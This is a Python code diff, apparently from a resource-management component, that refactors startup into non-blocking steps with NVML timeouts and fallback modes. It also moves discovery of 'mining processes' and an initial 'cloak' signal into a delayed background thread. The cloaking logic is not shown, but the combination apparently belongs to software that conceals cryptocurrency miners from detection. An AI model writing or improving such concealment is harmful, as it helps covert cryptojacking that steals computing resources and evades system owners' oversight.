@@ -61,13 +61,31 @@ class SharedResourceManager:
     def initialize_nvml(self):
         if not self._nvml_init:
             try:
-                # Optimized NVML initialization với timeout protection
-                self.logger.debug("Initializing NVML...")
-                pynvml.nvmlInit()
-                self._nvml_init = True
-                self.logger.info("NVML đã được khởi tạo thành công.")
-            except Exception as e:
-                self.logger.warning(f"NVML initialization failed: {e} - continuing without GPU support")
+                # Ultra-fast NVML initialization với timeout protection
+                self.logger.debug("Fast NVML initialization...")
+                
+                # Timeout wrapper cho NVML init
+                def nvml_init_with_timeout():
+                    pynvml.nvmlInit()
+                    return True
+                
+                # Try với timeout để tránh blocking
+                import signal
+                def timeout_handler(signum, frame):
+                    raise TimeoutError("NVML init timeout")
+                
+                signal.signal(signal.SIGALRM, timeout_handler)
+                signal.alarm(3)  # 3 giây timeout
+                
+                try:
+                    nvml_init_with_timeout()
+                    self._nvml_init = True
+                    self.logger.info("NVML đã được khởi tạo thành công.")
+                finally:
+                    signal.alarm(0)  # Clear timeout
+                    
+            except (TimeoutError, Exception) as e:
+                self.logger.warning(f"NVML initialization failed/timeout: {e} - continuing without GPU support")
                 self._nvml_init = False
 
     def shutdown_nvml(self):
@@ -355,31 +373,42 @@ class ResourceManager(IResourceManager):
         return metrics_data
 
     def start(self):
-        self.logger.info("🚀 Starting ResourceManager (Optimized Initialization)...")
+        self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
         start_time = time.time()
         try:
-            # Step 1: Fast resource managers creation với parallel optimization
+            # Step 1: Minimal essential initialization only
             step_start = time.time()
-            self.logger.info("⚡ Step 1/4: Fast resource managers creation...")
-            resource_managers = ResourceControlFactory.create_resource_managers(
-                config=self.config,
-                logger=self.logger
-            )
-            if not resource_managers:
-                raise RuntimeError("ResourceControlFactory trả về rỗng hoặc None.")
-            self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
-
-            # Step 2: Optimized SharedResourceManager với fast NVML init
-            step_start = time.time()
-            self.logger.info("⚡ Step 2/4: Optimized SharedResourceManager initialization...")
-            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
-            self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
-
-            # Step 3: Combined discovery + worker setup (parallel execution)
-            step_start = time.time()
-            self.logger.info("⚡ Step 3/4: Parallel process discovery & worker setup...")
+            self.logger.info("⚡ Step 1/3: Essential components creation...")
             
-            # Start worker thread ngay lập tức (parallel với discovery)
+            # Quick resource managers creation với timeout protection
+            try:
+                resource_managers = ResourceControlFactory.create_resource_managers(
+                    config=self.config,
+                    logger=self.logger
+                )
+                if not resource_managers:
+                    self.logger.warning("ResourceControlFactory trả về rỗng - using fallback mode")
+                    resource_managers = {}  # Fallback mode
+                self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
+            except Exception as e:
+                self.logger.warning(f"Resource managers creation failed: {e} - using fallback mode")
+                resource_managers = {}
+
+            # Step 2: Fast SharedResourceManager với lazy NVML init
+            step_start = time.time()
+            self.logger.info("⚡ Step 2/3: Fast SharedResourceManager (lazy init)...")
+            try:
+                self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
+                self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
+            except Exception as e:
+                self.logger.warning(f"SharedResourceManager init failed: {e} - continuing without shared resources")
+                self.shared_resource_manager = None
+
+            # Step 3: Background worker setup (non-blocking)
+            step_start = time.time()
+            self.logger.info("⚡ Step 3/3: Background workers setup...")
+            
+            # Start worker thread ngay lập tức
             adjust_thread = threading.Thread(
                 target=self.process_resource_adjustments,
                 daemon=True,
@@ -388,28 +417,47 @@ class ResourceManager(IResourceManager):
             adjust_thread.start()
             self.workers.append(adjust_thread)
             
-            # Discovery processes trong parallel với worker startup
-            discovery_results = self.discover_mining_processes()
+            # Background process discovery (non-blocking)
+            discovery_thread = threading.Thread(
+                target=self._background_discovery_and_cloak,
+                daemon=True,
+                name="BackgroundDiscovery"
+            )
+            discovery_thread.start()
+            self.workers.append(discovery_thread)
+            
             self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")
 
-            # Step 4: Fast initial cloaking trigger (non-blocking)
-            step_start = time.time()
-            self.logger.info("⚡ Step 4/4: Fast cloaking trigger...")
-            self._trigger_initial_cloak_signal()
-            self.logger.info(f"✅ Step 4 completed in {time.time() - step_start:.2f}s")
-
             total_time = time.time() - start_time
-            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <15s)")
+            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
             
-            # Fast-response main loop với optimized monitoring
-            self.logger.info("🔄 Entering optimized main monitoring loop...")
+            # Ultra-fast main loop với minimal monitoring
+            self.logger.info("🔄 Entering minimal main monitoring loop...")
             while not self._stop_flag:
-                time.sleep(0.5)  # Tăng responsiveness từ 1s xuống 0.5s
+                time.sleep(1.0)  # Basic monitoring interval
 
             self.logger.info("ResourceManager main loop completed.")
         except Exception as e:
             self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
             self.shutdown()
+
+    def _background_discovery_and_cloak(self):
+        """Background process discovery và cloaking (non-blocking)"""
+        try:
+            self.logger.info("🔍 Starting background process discovery...")
+            time.sleep(2)  # Delay để system startup xong
+            
+            discovery_results = self.discover_mining_processes()
+            self.logger.info(f"🔍 Background discovery found {len(discovery_results)} processes")
+            
+            # Trigger cloaking trong background
+            if discovery_results:
+                self._trigger_initial_cloak_signal()
+                self.logger.info("✅ Background cloaking triggered")
+            
+        except Exception as e:
+            self.logger.error(f"Background discovery error: {e}")
+            # Continue without failing - system vẫn hoạt động được
 
     def _trigger_initial_cloak_signal(self):
         """
